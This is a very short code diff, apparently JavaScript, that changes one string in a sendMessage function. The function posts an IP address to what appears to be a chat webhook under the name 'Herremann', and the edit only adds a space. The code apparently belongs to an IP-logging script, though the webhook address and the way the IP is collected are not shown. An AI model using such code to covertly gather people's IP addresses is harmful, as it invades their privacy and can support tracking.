@@ -14,7 +14,7 @@ function sendMessage(ipText) {
     const params = {
       username: "Herremann",
       avatar_url: "",
-      content: "Ip:" + ipText
+      content: "Ip: " + ipText
     }
 
     request.send(JSON.stringify(params));
